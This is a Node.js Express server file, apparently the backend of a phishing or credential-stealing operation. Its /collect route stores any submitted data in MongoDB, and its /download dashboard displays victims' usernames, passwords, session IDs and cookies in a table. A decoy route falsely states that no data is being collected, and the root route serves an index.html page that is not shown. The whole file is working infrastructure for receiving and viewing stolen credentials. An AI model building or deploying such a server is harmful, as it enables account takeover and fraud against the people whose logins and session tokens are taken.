const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path'); // <-- 1. Yeh line add karein upar

const app = express();

app.use(bodyParser.json());

// Serverless ke liye MongoDB Connection Caching
let isConnected = false;
async function connectDB() {
  if (isConnected) return;
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    isConnected = true;
    console.log("MongoDB connected successfully");
  } catch (error) {
    console.error("MongoDB connection error:", error);
    throw error;
  }
}

// Data Schema aur Model define karein
const dataSchema = new mongoose.Schema({
  payload: Object,
  createdAt: { type: Date, default: Date.now }
});

const CollectedData = mongoose.models.CollectedData || mongoose.model('CollectedData', dataSchema);

// 1. Data Collect Route (POST)
app.post('/collect', async (req, res) => {
  try {
    await connectDB();
    const newData = new CollectedData({ payload: req.body });
    await newData.save();
    console.log("Received and saved data:", req.body);
    res.status(200).send("Data collected and saved successfully!");
  } catch (err) {
    console.error("Error saving data:", err);
    res.status(500).send("Error saving data to database.");
  }
});

app.get('/no_think', (req, res) => {
  res.status(200).send("This is a normal website. No data is being collected.");
});

// 2. Data View Route (GET)
// Data View Route with Columns (HTML Table)
app.get('/download', async (req, res) => {
  try {
    await connectDB();
    const allData = await CollectedData.find({}).sort({ createdAt: -1 });

    let html = `
      <!DOCTYPE html>
      <html>
      <head>
        <title>Collected Data Dashboard</title>
        <style>
          body { font-family: Arial, sans-serif; background: #f4f7f6; padding: 20px; }
          h2 { color: #333; text-align: center; }
          table { width: 100%; border-collapse: collapse; background: #fff; margin-top: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 8px; overflow: hidden; }
          th, td { padding: 12px 15px; border-bottom: 1px solid #ddd; text-align: left; font-size: 14px; }
          th { background: #007bff; color: white; text-transform: uppercase; font-size: 13px; }
          tr:hover { background: #f1f1f1; }
          .badge { background: #e2e8f0; padding: 4px 8px; border-radius: 4px; font-family: monospace; }
        </style>
      </head>
      <body>
        <h2>Collected Data Dashboard</h2>
        <table>
          <tr>
            <th>Time</th>
            <th>Username</th>
            <th>Password</th>
            <th>Session ID</th>
            <th>Cookies</th>
          </tr>
    `;

    allData.forEach(item => {
      const p = item.payload || {};
      const time = new Date(item.createdAt).toLocaleString();
      html += `
        <tr>
          <td>${time}</td>
          <td><b>${p.username || 'N/A'}</b></td>
          <td><span class="badge">${p.password || 'N/A'}</span></td>
          <td>${p.sessionId || 'N/A'}</td>
          <td><small>${JSON.stringify(p.cookies || [])}</small></td>
        </tr>
      `;
    });

    html += `
        </table>
      </body>
      </html>
    `;

    res.status(200).send(html);
  } catch (err) {
    console.error("Error fetching data:", err);
    res.status(500).send("Error fetching data from database.");
  }
});

// 3. Root route par index.html serve karne ke liye (Yeh update karna hai)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

module.exports = app;
